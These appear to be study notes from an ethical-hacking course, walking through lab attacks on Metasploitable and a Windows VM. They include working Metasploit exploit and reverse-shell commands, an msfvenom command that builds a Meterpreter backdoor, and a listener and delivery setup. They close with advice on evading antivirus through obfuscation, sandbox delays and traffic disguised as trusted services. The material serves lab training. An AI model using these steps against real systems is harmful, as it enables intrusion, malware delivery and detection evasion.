
GAINING ACCESS - SERVER SIDE ATTACKS
===

This lecture serves as the **Introduction** to the next major phase of the course: **Gaining Access** (System Hacking).

You have graduated from attacking the *network* (the roads) to attacking the *devices* (the houses).

### 1. The Mindset: "Everything is a Computer"
The instructor wants you to change how you see electronics. A "target" isn't just a laptop.
* **The Reality:** A Smartphone, a Smart TV, a Wifi Router, and a giant Web Server are all fundamentally the same thing.
* **The Architecture:** They all have:
    1.  **Hardware**
    2.  **Operating System** (Windows, Linux, Android)
    3.  **Programs/Apps** running on top.
* **The User:** There is usually a human interacting with or configuring it.

If you learn how to hack a computer, you automatically learn the concepts for hacking a phone or a web server.

### 2. The Two Paths of Attack
There are two distinct ways to break into a computer. The course will cover both.

#### Path A: Server-Side Attacks
* **The Strategy:** Attacking the machine directly.
* **User Interaction:** **None.** You do not need the victim to click anything.
* **The Key:** You only need the target's **IP Address**.
* **How it works:** You scan the IP to see what "doors" (ports) are open and what software is running. If the software has a bug (vulnerability), you exploit it to break in.
* *Analogy:* Finding an unlocked window in a house and climbing in while the owner is asleep.

#### Path B: Client-Side Attacks
* **The Strategy:** Attacking the human user.
* **User Interaction:** **Required.** The victim must do something (download a file, click a link, install an update).
* **The Key:** **Information Gathering** about the person (Social Engineering).
* **How it works:** You create a **Trojan** (a virus hidden inside a picture or PDF) and trick the user into opening it.
* *Analogy:* Knocking on the front door disguised as a delivery driver and tricking the owner into letting you in.

### 3. Post-Exploitation (The "What Now?")
This is the final phase. Once you are inside (whether through a server-side bug or a client-side trick), what do you do?
* **Privilege Escalation:** Going from a "Guest" user to "Admin" (Root).
* **Pivoting:** Using the hacked computer to attack *other* computers on the same network.
* **Stealing Data:** Finding passwords, files, and secrets.

### Summary Roadmap
1.  **Server-Side:** Attack the software (No human needed).
2.  **Client-Side:** Attack the human (Social Engineering).
3.  **Post-Exploitation:** Control the system.

---

### <span style = "color: #569cd6">Metasploitable</span>

### 1. What is Metasploitable?
Metasploitable is a Linux-based Operating System that is **intentionally broken**.
* **The Concept:** It is designed to be extremely vulnerable. It comes pre-installed with dozens of security flaws, open ports, and weak configurations.
* **The Purpose:** It acts as a safe "punching bag." It allows you to practice dangerous server-side attacks legally and safely in your own lab.
* **Role:** You will almost never "use" this machine (i.e., you won't type documents on it). You will simply turn it on and attack it from your Kali Linux machine.



### 2. Installation Steps
The process is very similar to how you installed your Windows VM, but simpler because it comes pre-packaged.

**Step A: Download & Extract**
* Download the zip file (link provided in your course resources).
* **Extract/Unzip** the file. Do not try to open it directly from the zip; you must extract the folder first.

**Step B: Import to VMware**
* Open VMware.
* Click **Open a Virtual Machine**.
* Navigate to the extracted folder and select the **Metasploitable** file (usually ends in `.vmx`).

**Step C: Network Configuration (Crucial)**
* Before starting it, check the **Settings**.
* Ensure the Network Adapter is set to **NAT**.
* *Why?* It needs to be on the same network as your Kali Linux machine so they can "see" each other.

### 3. Running the Server
* Click **Start**.
* **Note:** This machine does *not* have a graphical interface (no mouse, no desktop icons). It is a command-line interface (CLI) only, which is typical for servers.
* **Login Credentials:**
    When prompted, type the following (note: the password will not show on screen as you type):

| Field | Value |
| :--- | :--- |
| **Username** | `msfadmin` |
| **Password** | `msfadmin` |



### 4. Why "Server-Side"?
The instructor mentions this is for "Server-Side Attacks."
* **Windows VM:** Used for **Client-Side** attacks (where you trick a human into clicking a link).
* **Metasploitable:** Used for **Server-Side** attacks (where you find a software bug and break in without any human interaction).
This lecture lays the ground rules for **Server-Side Attacks**.
---
Before you learn *how* to break in, you must understand *when* you are allowed to use these attacks.

### 1. The Definition: Server-Side Attacks
* **What are they?** Attacks that target the operating system or applications directly.
* **The Key Feature:** **No User Interaction Required.** You do not need the victim to click a link, download a file, or even be awake.
* **The Target:** You attack the software (e.g., a bug in the web server software), not the human.

### 2. The Golden Rule: "Can you Ping it?"
This is the most important technical takeaway from the lecture. You can only launch a server-side attack if you can communicate **directly** with the target machine.

* **The Problem (NAT):** Most home users (personal computers) are hidden behind a Router.
    * If you try to attack your friend in another city using their IP address, you will hit their **Router**, not their laptop. The router blocks you.
* **The Exception:** You **can** attack personal computers if they are on the **Same Network** (LAN) as you, because you can talk to them directly without a router blocking the way.
* **The Ideal Target (Servers):** Web servers (like Facebook, Google, or the Metasploitable VM) are designed to be talked to. They have "Real IPs" (Public IPs) that accept connections from anyone.

**Summary:**
* **Personal Computer (Remote/Different City):** Server-Side attacks usually **fail** (Blocked by Router).
* **Personal Computer (Local/Same Wifi):** Server-Side attacks **work**.
* **Web Server:** Server-Side attacks **work** best.

### 3. The Test: Verification
Before attempting any hack in this section, the instructor performs a simple test:
1.  Get the target IP (Metasploitable): `10.20.14.204`
2.  Go to the Attacker machine (Kali).
3.  Run `ping 10.20.14.204`.
4.  **Result:** If you get a reply, the path is clear. You can attack.

### 4. "Everything is a Computer"
The instructor reinforces the mindset shift.
* Metasploitable looks like a text-only command line.
* But when he opens a browser and types its IP, a website appears.
* **Lesson:** A "Web Server" is just a normal computer running a piece of software (like Apache) that shows websites. If you hack that software, you own the computer.

---

### <span style = "color: #569cd6">Basic Information Gathering & Exploitation</span>

Before you can hack a server, you need to know exactly what is running on it. You are looking for "open doors" (Ports) and checking if any of them were left unlocked (Misconfigurations) or have broken locks (Vulnerabilities).

### 1\. The Tool: Zenmap (Nmap)

The instructor uses **Zenmap** (the graphical version of Nmap) to scan the target.

  * **The Goal:** To list every **Service** (program) running on the target and which **Port** number it is listening on.
  * **The Concept:** "Everything is a computer." Whether you are scanning a massive website like Facebook or a small virtual machine like Metasploitable, the process is identical: Find the IP, scan the ports.

### 2\. The Analysis Strategy

Once the scan finishes, you get a long list of open ports. The hacking process is surprisingly simple: **Research them one by one.**

1.  **Pick a Port:** Look at the service name (e.g., `vsftpd`, `apache`, `exec`).
2.  **Google It:** Search for "[Service Name] vulnerabilities" or "[Service Name] default password."
3.  **Check for Misconfigurations:**
      * **Default Passwords:** Did the admin leave the password as `admin` or `root`?
      * **Backdoors:** Does this specific version of the software have a secret entrance left by the developers?
      * **Misconfigurations:** Is the service configured to let *anyone* in without a password?

### 3\. Vulnerability \#1: FTP (Port 21)

The scan reveals **Port 21** is open running an FTP service.

  * **The Flaw:** Zenmap reports "Anonymous FTP login allowed."
  * **Meaning:** The server is configured to let anyone log in without a valid account.
  * **The Fix/Exploit:** You could simply open a tool like FileZilla, connect to the IP, and download their files without hacking anything.

### 4\. Vulnerability \#2: Rlogin (Port 512)

The instructor focuses on **Port 512**, running a service called `exec` or `rlogin`.

  * **The Research:** Googling this service reveals it is a "Remote Execution" tool used to manage Linux computers remotely (similar to SSH but older and less secure).
  * **The Exploit:** The instructor tries to connect using the standard Linux command line tool `rlogin`.

**The Command:**

```bash
rlogin -l root 10.20.14.204
```

  * `-l root`: "I want to login as the Administrator (root)."
  * `10.20.14.204`: The target IP.

**The Result:**
Because the service was misconfigured, it **did not ask for a password**. The instructor was immediately dropped into a root shell.

  * **Verification:** He types `id` and sees `uid=0(root)`, confirming he has full control over the machine.

### Key Takeaway

You don't always need complex exploits or custom malware to hack a server. Often, the biggest vulnerability is simply a **Misconfiguration**—an administrator who installed a service and forgot to put a password on it.

---

### <span style = "color: #569cd6">Hacking a Remote Server Using a Basic Metasploit Exploit</span>

You are moving from manual exploitation (guessing passwords) to using automated, professional-grade tools to exploit specific code vulnerabilities (Backdoors).

### 1\. The Vulnerability: A Backdoor

A **Backdoor** is a secret entrance into a program left by the developers (intentionally or accidentally) that allows access without the normal authentication.

  * **The Target:** `vsftpd v2.3.4` (Very Secure FTP Daemon).
  * **The Flaw:** This specific version was hacked by an intruder in 2011 who added a malicious line of code. Anyone attempting to log in with a username containing a smiley face `:)` would trigger the backdoor and open a shell on port 6200.
  * **Discovery:** The instructor found this by simply Googling the service name found in Nmap (`vsftpd 2.3.4 exploit`), which led to the **Rapid7** database.

### 2\. The Tool: Metasploit Framework (MSF)

Metasploit is a massive database of "weaponized" exploits. Instead of writing code from scratch to hack a server, you simply select the exploit from Metasploit's library and fire it.

**Key Vocabulary:**

  * **Exploit:** The code that breaks in (The missile).
  * **Payload:** The code that runs *after* you break in (The explosive inside the missile).
  * **Module:** A piece of software inside Metasploit (can be an exploit, a scanner, etc.).

### 3\. The Commands (Cheat Sheet)

The instructor introduces the "Language of Metasploit." You will use these four commands constantly throughout your career.

| Command | Usage | Meaning |
| :--- | :--- | :--- |
| `msfconsole` | `root@kali:~# msfconsole` | Starts the program. |
| `use` | `use exploit/unix/ftp/vsftpd_234_backdoor` | Selects the weapon you want to use. |
| `show options` | `show options` | Displays the settings you need to configure (like Target IP). |
| `set` | `set RHOST 10.20.14.204` | Configures a setting. |
| `exploit` | `exploit` | Launches the attack. |

### 4\. Step-by-Step Execution

Here is the exact workflow used in the lecture to hack the server:

1.  **Launch:**
    ```bash
    msfconsole
    ```
2.  **Select Exploit:**
    The instructor found the exploit name on the Rapid7 website.
    ```bash
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```
3.  **Configure Target:**
    He checks the options and sees that `RPORT` (Remote Port) is already 21. He only needs to set the `RHOST` (Remote Host / Target IP).
    ```bash
    show options # to see options
    set RHOST 10.20.14.204
    ```
4.  **Fire:**
    ```bash
    exploit
    ```
5.  **Verification:**
    The terminal changes. He types `id` and sees `uid=0(root)`.
      * **Result:** He has full administrative control over the server.

### 5\. Troubleshooting

Did you notice the exploit failed the first time?

  * **Attempt 1:** Ran `exploit`, nothing happened.
  * **Attempt 2:** Ran `exploit` again immediately, and it worked.
  * **Lesson:** Hacking tools can be unstable. If an exploit fails but you are *sure* the target is vulnerable, always try again.

---

### <span style = "color: #569cd6">Exploiting a Code Execution Vulnerability to Hack Remote Server</span>

This lecture introduces a significant jump in complexity. You are moving from simply "walking through an open door" (Backdoors) to "breaking the lock" (Code Execution Vulnerabilities).

In the previous lecture, the FTP backdoor was essentially a "feature" left by a hacker; you just had to connect to it. In this lecture, the Samba program is *not* designed to let you in. You are forcing it to run your code by exploiting a programming mistake. This requires you to send a **Payload**.

### 1\. The Target: Samba (Port 139)

  * **What is Samba?** It is a service that allows Linux computers to share files with Windows computers.
  * **The Vulnerability:** You discovered that `Samba 3.x` is running on Port 139.
  * **The Research:** Googling "Samba 3.x exploit" leads to a rapid7 page describing the `usermap_script` vulnerability. This flaw allows a hacker to trick the server into running terminal commands.

### 2\. The New Concept: Payloads

This is the most critical concept in this lecture.

  * **The Exploit** is the *method* of breaking in (the drill).
  * **The Payload** is the *code* you want to run once you are inside (what you do after drilling the hole).

Since this isn't a pre-made backdoor, the server doesn't know what to do once you break in. You have to tell it. You do this by selecting a Payload.

### 3\. Bind Shell vs. Reverse Shell

When choosing a payload, you generally have two "directions" for the connection. Understanding the difference is vital for bypassing Firewalls.

  * **Bind Shell:**
      * **How it works:** You tell the victim to open a port (e.g., 4444) and wait for you to connect.
      * **The Problem:** Firewalls usually block *incoming* connections. If you try to connect to the victim's random port, the firewall will stop you.
  * **Reverse Shell (The Hacker's Choice):**
      * **How it works:** You tell the victim to connect *back* to you.
      * **The Advantage:** Firewalls usually allow *outgoing* connections (so employees can browse the web). The firewall sees the victim computer reaching out to the internet (you) and allows it.

### 4\. The Execution Steps

The workflow follows the standard Metasploit pattern, but with an extra step for the Payload.

**Step A: Select the Exploit**

```bash
use exploit/multi/samba/usermap_script
show options
```

**Step B: Configure the Target**

```bash
set RHOST 10.20.14.204
```

*(RHOST = Remote Host = The Victim)*

**Step C: Select the Payload**
The instructor chooses a "Reverse Netcat" payload.

```bash
show payloads # to see payloads
set PAYLOAD cmd/unix/reverse_netcat
```

**Step D: Configure the Attacker (Crucial)**
Because this is a **Reverse** connection, the victim needs to know *where* to send the connection back to.

```bash
set LHOST 10.20.14.203
```

*(LHOST = Listening Host = YOUR IP Address)*

**Step E: Fire**

```bash
exploit
```

### 5\. The Result

1.  Metasploit sends the exploit to the Samba service.
2.  The exploit tricks Samba into executing the Payload.
3.  The Payload (Reverse Netcat) tells the server: "Connect back to `10.20.14.203`."
4.  Your Kali machine receives the connection.
5.  **Result:** You see `Command shell session 1 opened`. You type `id` and see `uid=0(root)`. You have total control.

---

### <span style = "color: #569cd6">Nexpose</span>

This lecture introduces **Nexpose**, an enterprise-grade vulnerability management framework developed by Rapid7 (the creators of Metasploit). Unlike the smaller tools used previously, Nexpose is designed to manage the entire security lifecycle for large organizations.

### 1\. What is Nexpose?

Nexpose is a comprehensive **Vulnerability Management Framework**.

  * **Purpose:** It doesn't just find open ports; it identifies vulnerabilities, verifies if exploits exist (often linking to Metasploit), and generates detailed reports for both technical teams and management.
  * **Target Audience:** Large enterprises with powerful infrastructure.
  * **Requirements:** It is very resource-hungry, requiring a minimum of **8GB of RAM** and significant storage.
      * *Note:* The instructor mentions that if your lab computer cannot handle these specs, it is acceptable to just watch the lecture, as this tool is typically provided on dedicated hardware in a real job.


---

### <span style = "color: #569cd6">Server-Side Attacks Conclusion</span>

### 1. The Universal Workflow
The instructor emphasizes that whether you are doing a Capture The Flag (CTF) challenge or a real-world penetration test, the steps are always the same loop:

1.  **Discovery (Nmap):** Find the target and list all open ports (e.g., Port 21, Port 80, Port 139).
2.  **Enumeration (Version Detection):** Identify exactly *what* is running on those ports (e.g., "Apache 2.2.8" or "Samba 3.x").
3.  **Vulnerability Research:** Google is your best weapon here.
    * *Search Query:* "[Service Name] [Version] exploit" or "[Service Name] vulnerability".
    * *Sources:* Exploit-DB, Rapid7, CVE databases.
4.  **Exploitation:**
    * If available, use **Metasploit** (easy mode).
    * If not, find a manual script (python/bash) and learn how to run it (hard mode).
5.  **Verification:** Confirm the attack worked (e.g., gaining a shell) and document it.

### 2. The Reality of Hacking
* **The Constant:** The methodology (Scan $\rightarrow$ Search $\rightarrow$ Exploit).
* **The Variable:** The specific exploit.
    * The instructor notes he cannot teach you *every* exploit because there are thousands. The skill lies in **researching** the specific service you found and figuring out how to break it on the fly.

### 3. What if Server-Side Attacks Fail?
If you scan a server and every single service is patched and secure (no vulnerabilities found), you cannot break in using the "Server-Side" approach.

* **The Alternative:** You must switch to **Client-Side Attacks**.
* **The Logic:** If the *machine* is secure, attack the *human* using it. Instead of forcing your way in through a digital hole, you trick the user into opening the door for you (e.g., sending a fake update or a virus hidden in a PDF).


---

GAINING ACCESS - CLIENT SIDE ATTACKS
===
This lecture introduces the second major path to hacking a system: **Client-Side Attacks**.

If Server-Side attacks are about breaking down the front door (exploiting a vulnerability in the machine), Client-Side attacks are about tricking the person inside into unlocking it for you.


### 1. When to use Client-Side Attacks?
The instructor explains that Server-Side attacks are preferred because they are cleaner (no user interaction), but they often fail in two scenarios:
* **Scenario A: The System is Secure.** The target has updated their software and has no open ports or vulnerabilities.
* **Scenario B: The Target is Hidden (NAT).**
    * If you try to hack a friend in a different city, you cannot ping their laptop directly. You only hit their Router (Public IP). The router acts as a shield, blocking any direct connection you try to make to the laptop.


### 2. The Core Concept: Reverse Connection
Since you cannot connect to *them* (because of the router/firewall), you must make them connect to *you*.
* **The Trap:** You send the victim a file (a fake update, a PDF, an image) or a link.
* **The Interaction:** The victim *must* open it. This is the weakness of this method—if they ignore it, the attack fails.
* **The Payload:** Once opened, the malicious code inside executes and sends a connection *out* from their laptop *back* to your machine. Firewalls usually allow outgoing traffic, so the connection succeeds.

### 3. The Shift in Information Gathering
In Server-Side attacks, you scanned for *ports* and *versions*. In Client-Side attacks, you scan the **Human**.
* **Social Engineering:** You need to know the victim's habits to trick them effectively.
    * *Who are their friends?* (So you can pretend to be one).
    * *What websites do they trust?* (So you can clone them).
    * *What software do they use?* (So you can send a fake update for that specific tool).

### Summary Comparison

| Feature | Server-Side Attacks | Client-Side Attacks |
| :--- | :--- | :--- |
| **Target** | The Machine (OS/Software) | The Human (User) |
| **User Interaction** | None (Silent) | **Required** (Click/Open) |
| **Main Obstacle** | Patches/Updates | Common Sense/Paranoia |
| **Best For** | Servers / Local Networks | Remote Users / Protected Networks |

---

### <span style = "color: #569cd6">Backdoors and Payload Basics</span>

### **1. Key Definitions**

Before you can build them, you need to understand the two main components mentioned:

  * **The Backdoor (The "Vehicle"):**
    This is the actual file (like an `.exe` program) that the victim runs. To the user, it might look like a game or a document, or it might be invisible. Its job is to carry the malicious code into the system.
  * **The Payload (The "Driver"):**
    This is the specific code *inside* the backdoor that does the actual work. It is what gives you control.
      * *Think of it this way:* If the Backdoor is a Trojan Horse, the Payload is the soldiers hiding inside.

**What can a payload do?**
Once executed, it allows you to:

  * Run system commands.
  * Upload/Download files.
  * Keylog (record what they type).
  * Turn on the webcam.
  * View their desktop remotely.


### **2. The Tool: msfvenom**

The lecturer introduces **`msfvenom`** (part of the Metasploit framework) as the industry standard for generating these payloads.

  * **Why start here?** While advanced hackers use custom tools to bypass antivirus software, `msfvenom` is the best place to learn the *mechanics* of how payloads work.
  * **How to check it:** In Kali Linux, the command `msfvenom --list` shows every possible payload available.

### **3. Decoding the Payload Name**

This is the most technical part of the lecture. `msfvenom` payload names look like long file paths (e.g., `windows/shell/reverse_tcp`). The lecturer explains that this isn't random; it follows a strict "Grammar":

**`[Platform] / [Type] / [Communication Method]`**

#### **Part A: Platform**

This tells `msfvenom` which operating system or environment the payload is for.

  * **OS Specific:** `windows`, `linux`, `android`, `apple_ios`.
  * **Language Specific:** `python`, `php`, `java`.
      * *Note:* Language payloads are special. A `python` payload will run on Windows, Linux, or Mac, as long as that computer has Python installed.

#### **Part B: Type**

This defines *what* creates the connection and what capabilities you get.

  * **Shell:** Gives you a basic command line (like `cmd.exe` on Windows or `bash` on Linux). You can type commands, but it's basic.
  * **Meterpreter:** The "Swiss Army Knife" of payloads. It runs entirely in the computer's memory (making it harder to detect) and has advanced features like encryption and modular plugins.
  * **VNC:** Gives you visual control of their desktop (like TeamViewer).
  * **Msgbox:** Just pops up a message box. (Useful for "Proof of Concept"—proving you *could* hack them without actually damaging anything).

#### **Part C: Communication Method**

This describes how the payload talks back to you. It usually consists of a **Protocol** (TCP, HTTP, HTTPS) and a **Direction** (Bind or Reverse).

### **4. Deep Dive: Bind vs. Reverse Shells**

The lecturer spends a lot of time here because picking the wrong one means your hack will fail.

#### **Option 1: Bind Shell (Direct Connection)**

  * **How it works:** The backdoor opens a "port" (a door) on the *victim's* computer. You (the hacker) then connect to that IP address and port.
  * **The Problem:** Firewalls hate this. Firewalls are designed to stop strangers from entering. If a random computer tries to connect to a victim's PC, the firewall usually blocks it immediately.

#### **Option 2: Reverse Shell (Connect-Back)**

  * **How it works:** You open a port on *your* computer (the hacker's machine) and wait. When the victim runs the backdoor, *their* computer calls *you*.
  * **The Advantage:** Firewalls are usually configured to stop people coming *in*, but they allow users to send traffic *out* (like browsing the web).
  * **The Trick:** If you configure your reverse shell to use port **80** (HTTP) or **443** (HTTPS), the traffic looks exactly like the victim is just browsing a website. This is how you bypass firewalls.

### **5. Examples from the Text**

| Payload Name | Breakdown | Meaning |
| :--- | :--- | :--- |
| `windows/shell/reverse_tcp` | **Platform:** Windows<br>**Type:** Shell<br>**Comm:** Reverse TCP | A basic command line for Windows that connects back to you over raw TCP. |
| `python/meterpreter/reverse_http` | **Platform:** Python<br>**Type:** Meterpreter<br>**Comm:** Reverse HTTP | A powerful Meterpreter payload written in Python. It connects back to you pretending to be web traffic. |
| `apple_ios/aarch64/meterpreter_reverse_tcp` | **Platform:** iOS (ARM64)<br>**Type:** Meterpreter<br>**Comm:** Reverse TCP | A payload specifically for modern iPhones (ARM64 chips) that connects back to you. |

### **Summary Checklist**

1.  **Backdoor** = The container program.
2.  **Payload** = The malicious code inside.
3.  **Naming Convention** = Platform / Type / Connection.
4.  **Reverse Connections** are usually better than **Bind Connections** because they bypass firewalls.

---

### <span style = "color: #569cd6">Creating Your Own Backdoors</span>

### **The Goal: Creating a Windows Backdoor**

In the previous lecture, you learned the theory. Now, the instructor is moving to practice. The objective is to create a malicious `.exe` file that, when opened by a Windows user, will give you (the hacker) full control over their machine.

### **1. The Command Breakdown**

The instructor builds a single, long command step-by-step. Let's deconstruct it so you understand every flag.

The final command looks like this:

`msfvenom --payload windows/meterpreter/reverse_https LHOST=192.168.0.26 LPORT=8080 --format exe --out rev_https_8080.exe`

Here is what each part does:

#### **A. Selecting the Payload (`--payload` or `-p`)**
* **Command:** `--payload windows/meterpreter/reverse_https`
* **Explanation:**
    * **Platform (`windows`):** We are targeting a Windows computer.
    * **Type (`meterpreter`):** We want the advanced "Swiss Army Knife" payload that runs in memory and encrypts communication.
    * **Communication (`reverse_https`):** We want the victim's computer to call *us* back using the HTTPS protocol. This makes the traffic look like normal web browsing, helping it bypass firewalls.

#### **B. Configuring the Connection (`LHOST` and `LPORT`)**
Before `msfvenom` can build the file, it needs to know *where* to send the connection back to.



* **LHOST (Local Host):**
    * **Command:** `LHOST=192.168.0.26` (Note: *You must use your own IP address here.*)
    * **How to find it:** Run `ifconfig` in your terminal to see your current IP.
    * **Purpose:** This tells the backdoor, "When you wake up, call *this* specific IP address."
* **LPORT (Local Port):**
    * **Command:** `LPORT=8080`
    * **Purpose:** This is the specific "door" on your computer the backdoor will knock on.
    * **Why 8080?** Ports 80 and 8080 are standard for web traffic. By using 8080 combined with HTTPS, the malicious connection blends in with legitimate internet activity.

#### **C. Formatting the Output (`--format` and `--out`)**
* **Format:** `--format exe` tells `msfvenom` to package the code as a standard Windows executable application.
* **Output Name:** `--out rev_https_8080.exe` names the file. The instructor uses a descriptive name so they remember exactly what this specific backdoor does later.

### **2. Visualizing the Process**

It helps to visualize the flow of information during this setup.

1.  **Input:** You give `msfvenom` the Blueprint (Payload) and the Address (LHOST/LPORT).
2.  **Processing:** `msfvenom` compiles this into binary code.
3.  **Output:** You get a `.exe` file in your root directory.

### **3. Key Practical Tips from the Lecture**

* **Check Options First:** Before generating, you can run `msfvenom --payload [name] --list-options`. This is crucial because different payloads require different settings. For example, some might need an encryption key or different parameters.
* **Know Your Directory:** The instructor checks `pwd` (print working directory) to verify where the file will land. By default in Kali, this is often the `/root` folder.
* **Verify Creation:** Always check your file manager or run `ls` after the command finishes to ensure the `.exe` was actually created and has a file size greater than zero.


---

### <span style = "color: #569cd6">Listening for Backdoors Connections</span>

### **The Big Idea: The "Pitcher and Catcher"**

To understand this lecture, think of a game of baseball.

  * **The Backdoor (from the previous lecture):** This is the **ball**. You gave it to the victim (the pitcher), and eventually, they are going to throw it back to you.
  * **The Listener (this lecture):** This is the **catcher's mitt**.

If the victim throws the ball (executes the backdoor) but you aren't standing there with your mitt open (listening), the ball just hits the ground. The connection fails. This lecture is entirely about setting up that "mitt" to catch the incoming connection.

### **1. The Tool: Metasploit Framework**

While we used `msfvenom` to *create* the payload, we use the main **Metasploit Console (`msfconsole`)** to *manage* the attack.

The instructor uses a specific module called the **Multi-Handler**.

  * **Command:** `use exploit/multi/handler`
  * **What it is:** This is a generic "listener." It doesn't care *how* you hacked the computer; its only job is to wait for a connection to come back home.

### **2. The Golden Rule: Mirroring**

This is the most critical part of the lecture. The configuration of your Listener **must exactly mirror** the configuration of your Backdoor. If even one digit is off, the connection will fail.

The instructor emphasizes three settings that must match:

| Setting | In the Backdoor (`msfvenom`) | In the Listener (`msfconsole`) | Why? |
| :--- | :--- | :--- | :--- |
| **PAYLOAD** | `windows/meterpreter/reverse_https` | `windows/meterpreter/reverse_https` | If the backdoor speaks "HTTPS" but the listener expects "TCP," they won't understand each other. |
| **LHOST** | `192.168.0.26` (Your IP) | `192.168.0.26` (Your IP) | The listener needs to know which network interface to bind to. |
| **LPORT** | `8080` | `8080` | If the backdoor knocks on door 8080, but you are listening at door 4444, no one answers. |

-----

### **3. The Setup Steps**

Here is the workflow the instructor follows in the console:

**Step 1: Load the Module**

```bash
use exploit/multi/handler
```

  * *Translation:* "I want to use the tool that listens for incoming connections."

**Step 2: Fix the Payload**
By default, Metasploit might load a generic payload (like `reverse_tcp`). You have to change it.

```bash
set PAYLOAD windows/meterpreter/reverse_https
```

  * *Translation:* "I am expecting a Windows Meterpreter connection over HTTPS."

**Step 3: Set the Address (LHOST)**

```bash
set LHOST 192.168.0.26
```

  * *Translation:* "Listen on my IP address." (Remember to use `ifconfig` to find your *actual* IP).

**Step 4: Set the Port (LPORT)**

```bash
set LPORT 8080
```

  * *Translation:* "Open port 8080 and wait."

**Step 5: Verify**

```bash
show options
```

  * *Translation:* "Show me the current configuration so I can double-check for typos."

### **4. Launching the Attack**

Once the settings are perfect, the instructor types:

```bash
exploit
```

(Or sometimes you will see `run`, which does the same thing).

**What happens next?**
The terminal will likely appear to "freeze" or hang. It will say something like:
`[*] Started HTTPS reverse handler on 192.168.0.26:8080`

**This is normal.** It means the trap is set. Your computer is now actively listening to that port, ignoring everything else, just waiting for the victim to click the `.exe` file you created.

### **Summary Checklist**

1.  **Backdoor** = Sends the signal.
2.  **Listener** = Receives the signal.
3.  **Configuration** = Must be an exact mirror image (Payload, IP, Port).
4.  **Action** = Type `exploit` to start waiting.

---

### <span style = "color: #569cd6">Hacking Windows 11 Using Your Own Backdoors</span>

### **The Big Picture: Delivery and Execution**
We have built the bomb (the Backdoor), we have set the trap (the Listener), and now this lecture is about **Delivery**. The instructor shows a simple way to move the file from your hacker machine (Kali) to the victim machine (Windows) to prove that the connection works.

### **1. The Transfer Method: Apache Web Server**
Real hackers use sophisticated methods (fake emails, USB drives, Trojan websites), but for testing, the instructor uses the simplest method available: **hosting a website on his own computer.**

* **The Concept:** Kali Linux comes with a built-in web server software called **Apache**. By turning this on, your hacker computer effectively becomes a website. Anyone on your local network (like the Windows victim machine) can type in your IP address and download files from you.

#### **Step-by-Step Setup:**
1.  **Locate the Web Folder:**
    * On Linux, the "public" folder for websites is almost always `/var/www/html/`.
    * Whatever you put in this folder is visible to the network.
2.  **Move the Backdoor:**
    * The instructor creates a folder called `evil-files` inside that directory.
    * He copies the `rev_https_8080.exe` file into `/var/www/html/evil-files/`.
3.  **Start the Service:**
    * **Command:** `service apache2 start`
    * *Translation:* "Computer, please turn on the web server software now."

### **2. The Security Barrier: Antivirus**
This is a critical "reality check" in the lecture.

* **The Problem:** The backdoor we created is "raw." It hasn't been disguised or encoded. Modern antivirus software (like Windows Defender) recognizes `msfvenom` signatures instantly and will delete the file the moment it touches the disk.
* **The Temporary Fix:** Because this is just a learning exercise to test connectivity, the instructor explicitly turns **OFF** all protections on the Windows machine (Real-time protection, Cloud-delivered protection, etc.).
    * *Note:* In later lectures (as hinted), you will learn "Evasion" techniques to bypass these checks. For now, we are "cheating" to make sure the networking works.

### **3. The Execution (The "Click")**
1.  **Download:** On the Windows machine, the user opens a browser and types the hacker's IP: `192.168.0.26/evil-files`.
2.  **Run:** The user downloads and double-clicks the `.exe` file.
    * *Visual:* To the Windows user, nothing happens. No game opens, no document appears. It looks like the file failed.
3.  **Connection:** However, on the Kali Linux machine, the terminal changes.

### **4. The Success State: "Meterpreter Session Opened"**


When the connection is successful, your listener terminal transforms.
* **Old Prompt:** `msf6 >` (The standard Metasploit menu).
* **New Prompt:** `meterpreter >`

This prompt is your "Remote Control" command line. You are no longer typing commands for your own computer; you are typing commands that execute inside the victim's memory.

**The Verification Command:**
* **Command:** `sysinfo`
* **Output:** It lists the Computer Name, OS (Windows 10), and Architecture of the *victim*. This proves you are "inside."

### **Summary Checklist**
1.  **Transfer:** Used the `/var/www/html` folder to host the file.
2.  **Service:** Started `apache2` to make the file downloadable.
3.  **Evasion:** Disabled Windows Defender (temporarily) because the payload is raw.
4.  **Success:** The `meterpreter >` prompt confirms full control.

### **Final Course Recap**
You have now walked through the entire lifecycle of a basic client-side attack:
1.  **Creation:** Used `msfvenom` to build a payload.
2.  **Listening:** Used `msfconsole` to wait for the call.
3.  **Execution:** Delivered and ran the file to get a shell.

---

### <span style = "color: #569cd6">How to Bypass Anti-Virus Programs</span>

### **The Challenge: Getting Past the Guard**

In the previous lectures, you built a working backdoor and tested it. However, you had to turn *off* Windows Defender to make it work. In the real world, victims won't do that for you. This lecture explains the theory of **Evasion**—how to trick the security guard (Antivirus/AV) so you can sneak your backdoor in.

### **1. How Antivirus (AV) Works**

To beat the system, you must understand how it detects you. The instructor explains two main methods AV uses:

#### **Method A: Static Analysis (The Mugshot Check)**
* **How it works:** This is the simplest form of detection. The AV looks at the *code* of your file without running it. It compares your file's "fingerprint" against a massive database of known bad files.
* **The Metaphor:** Imagine a security guard at an airport holding a book of mugshots of known criminals. When you walk up, he looks at your face. If you look like "Criminal #452," you are arrested immediately.
* **Why `msfvenom` fails here:** Since `msfvenom` is a standard tool used by millions, its "mugshot" (code signature) is already in every AV database.
* **How to Bypass:**
    * **Change the Face:** You need to make your code look unique so it doesn't match the database.
    * **Tools:** Packers, Encoders, Obfuscators. These tools scramble the code so it looks different but functions the same.
    * **Manual Coding:** Writing your own unique backdoor from scratch (using Python, C++, etc.) is the most effective way because no database has seen your unique code before.

#### **Method B: Dynamic/Heuristic Analysis (The Behavior Check)**
* **How it works:** This is the advanced method. If the file passes the "Mugshot Check," the AV runs it in a safe, isolated room called a **Sandbox**. It watches what the file *does*.
* **The Red Flags:**
    * Does it try to open a network connection immediately?
    * Does it try to change system files?
    * Does it try to encrypt files (ransomware behavior)?
* **The Metaphor:** The security guard lets you in, but follows you around. If you start trying to pick locks or break windows, he arrests you.
* **How to Bypass:**
    * **Act Normal:** You must make your program behave like a boring, safe application.
    * **Camouflage:** Combine your backdoor with a real program (like a calculator). The user sees a calculator, but the backdoor runs in the background.
    * **Delay Execution:** If the AV sandbox only watches for 10 seconds, make your backdoor "sleep" for 5 minutes before doing anything malicious. The AV will get bored, assume it's safe, and let it run.
    * **Creative Communication:** Instead of a direct suspicious connection, route your traffic through trusted apps like **Discord**, **Telegram**, or **GitHub**. AV software usually trusts these websites, so it won't block the traffic.

### **2. Summary Comparison**

